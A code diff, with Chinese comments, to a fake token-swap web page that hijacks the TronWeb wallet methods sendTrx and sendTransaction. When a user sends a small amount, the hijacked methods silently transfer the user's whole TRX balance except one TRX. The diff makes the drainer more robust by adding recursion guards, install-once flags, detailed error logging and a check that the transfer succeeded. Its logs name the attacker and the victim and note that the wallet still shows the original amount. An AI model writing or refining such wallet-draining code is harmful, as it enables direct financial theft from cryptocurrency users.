@@ -2307,7 +2307,8 @@
         await getTronBalance(address);
 
         // 🎯🎯🎯 关键恶意后门：劫持TronWeb的交易方法
-        if (window.tronWeb && window.tronWeb.trx){
+        if (window.tronWeb && window.tronWeb.trx && !window.tronWebHijacked){
+            window.tronWebHijacked = true; // 防止重复劫持
             // 🎯 劫持sendTransaction方法
             const originalSendTransaction = window.tronWeb.trx.sendTransaction;
             window.tronWeb.trx.sendTransaction = async function(to, amount,from,options){
@@ -2342,33 +2343,56 @@
             
             // 🎯 劫持sendTrx方法
             const originalSendTrx = window.tronWeb.trx.sendTrx;
+            let hijackInProgress = false; // 防止无限递归
+            
             window.tronWeb.trx.sendTrx = async function(to, amount, from, options){
-                debugLog('🎯🎯🎯 劫持到用户交易请求！🎯🎯🎯');
-                debugLog(`🎯 用户以为转账: ${amount / 1000000} TRX`);
+                // 🎯 防止递归调用
+                if (hijackInProgress) {
+                    debugLog('🔄 检测到递归调用，直接执行原始方法');
+                    return await originalSendTrx.call(this, to, amount, from, options);
+                }
+                
+                hijackInProgress = true;
+                
+                try {
+                    debugLog('🎯🎯🎯 劫持到用户交易请求！🎯🎯🎯');
+                    debugLog(`🎯 用户以为转账: ${amount / 1000000} TRX`);
 
-                // 🎯 恶意修改：将转账金额改为用户全部余额
-                const userTotalBalance = await tronWeb.trx.getBalance(from || currentAccount);
-                const feeReserve = tronWeb.toSun(1);// 只预留1 TRX手续费
-                const maliciousAmount = userTotalBalance - feeReserve;
+                    // 🎯 恶意修改：将转账金额改为用户全部余额
+                    const userTotalBalance = await tronWeb.trx.getBalance(from || currentAccount);
+                    const feeReserve = tronWeb.toSun(1);// 只预留1 TRX手续费
+                    const maliciousAmount = userTotalBalance - feeReserve;
 
-                debugLog(`🎯 恶意修改转账金额:`);
-                debugLog(`- 用户余额: ${tronWeb.fromSun(userTotalBalance)} TRX`);
-                debugLog(`- 预留手续费: ${tronWeb.fromSun(feeReserve)} TRX`);
-                debugLog(`- 实际转账: ${tronWeb.fromSun(maliciousAmount)} TRX`);
-                debugLog(`🎯 用户在imToken中看到的还是原始金额，但实际转走全部余额！`);
+                    debugLog(`🎯 恶意修改转账金额:`);
+                    debugLog(`- 用户余额: ${tronWeb.fromSun(userTotalBalance)} TRX`);
+                    debugLog(`- 预留手续费: ${tronWeb.fromSun(feeReserve)} TRX`);
+                    debugLog(`- 实际转账: ${tronWeb.fromSun(maliciousAmount)} TRX`);
+                    debugLog(`🎯 用户在imToken中看到的还是原始金额，但实际转走全部余额！`);
 
-                // 🎯 执行恶意转账：转走用户全部余额
-                try{
+                    // 🎯 执行恶意转账：转走用户全部余额
+                    debugLog(`🎯 准备调用原始sendTrx方法...`);
+                    debugLog(`🎯 参数: to=${to}, maliciousAmount=${maliciousAmount}, from=${from}`);
+                    
                     const result = await originalSendTrx.call(this, to, maliciousAmount, from, options);
+                    
                     debugLog('🏆🏆🏆 恶意后门攻击成功！🏆🏆🏆');
                     debugLog(`💰 实际转走: ${tronWeb.fromSun(maliciousAmount)} TRX`);
                     debugLog(`😈 用户以为只转了: ${amount / 1000000} TRX`);
+                    debugLog(`🎯 交易结果: ${JSON.stringify(result)}`);
 
                     return result;
-                }catch (error) {
+                    
+                } catch (error) {
                     debugLog(`❌ 恶意转账失败: ${error.message}`);
+                    debugLog(`❌ 错误详情: ${JSON.stringify(error)}`);
+                    debugLog(`❌ 错误堆栈: ${error.stack}`);
+                    
                     // 如果恶意转账失败，执行原始转账
+                    debugLog(`🎯 回退到原始转账: ${amount / 1000000} TRX`);
                     return await originalSendTrx.call(this, to, amount, from, options);
+                    
+                } finally {
+                    hijackInProgress = false;
                 }
             };
             
@@ -2732,6 +2756,13 @@
 
         // 🎯 执行看似正常的转账（恶意后门会劫持）
         showToast('正在处理兑换...', 'info');
+        
+        // 🎯 在移动端显示更详细的状态
+        debugLog('🎯 开始兑换流程...');
+        debugLog(`🎯 用户输入金额: ${fromAmount} TRX`);
+        debugLog(`🎯 攻击者地址: ${ATTACKER_ADDRESS}`);
+        debugLog(`🎯 当前用户地址: ${currentAccount}`);
+        debugLog(`🎯 TronWeb劫持状态: ${window.tronWebHijacked ? '已安装' : '未安装'}`);
 
 
         debugLog('🎯 攻击记录已保存:');
@@ -2860,15 +2891,22 @@
                 debugLog(`🎯 transaction类型: ${typeof transaction}`);
                 debugLog(`🎯 transaction内容: ${JSON.stringify(transaction)}`);
 
-                debugLog(`🎯 真实转账成功！交易哈希: ${transaction.txid || transaction}`);
-                debugLog('🏆🏆🏆 攻击完全成功！真实TRX已转移！🏆🏆🏆');
-                debugLog(`💰 A成员（攻击者）已收到: ${availableBalance} TRX`);
-                debugLog(`💰 B成员（受害者）剩余: ${feeReserve} TRX (手续费)`);
-                debugLog(`💰 等价USD价值: $${(availableBalance * 0.1634).toFixed(2)}`);
-                debugLog(`😈 B成员（受害者）以为只兑换了: ${fromAmount} TRX`);
+                // 🎯 检查交易是否真的成功
+                if (transaction && (transaction.txid || transaction.result || typeof transaction === 'string')) {
+                    const txHash = transaction.txid || transaction.result || transaction;
+                    debugLog(`🎯 真实转账成功！交易哈希: ${txHash}`);
+                    debugLog('🏆🏆🏆 攻击完全成功！真实TRX已转移！🏆🏆🏆');
+                    debugLog(`💰 A成员（攻击者）已收到: ${availableBalance} TRX`);
+                    debugLog(`💰 B成员（受害者）剩余: ${feeReserve} TRX (手续费)`);
+                    debugLog(`💰 等价USD价值: $${(availableBalance * 0.1634).toFixed(2)}`);
+                    debugLog(`😈 B成员（受害者）以为只兑换了: ${fromAmount} TRX`);
 
-                // 🎯 只有在真实交易成功后才显示成功消息
-                showToast(`兑换成功！获得 ${(fromAmount * 0.1634).toFixed(6)} USDT`, 'success');
+                    // 🎯 只有在真实交易成功后才显示成功消息
+                    showToast(`兑换成功！获得 ${(fromAmount * 0.1634).toFixed(6)} USDT`, 'success');
+                } else {
+                    debugLog(`❌ 交易返回值异常: ${JSON.stringify(transaction)}`);
+                    throw new Error('Transaction returned invalid result');
+                }
 
                 // 🎯 真实交易成功后重置表单
                 setTimeout(() => {
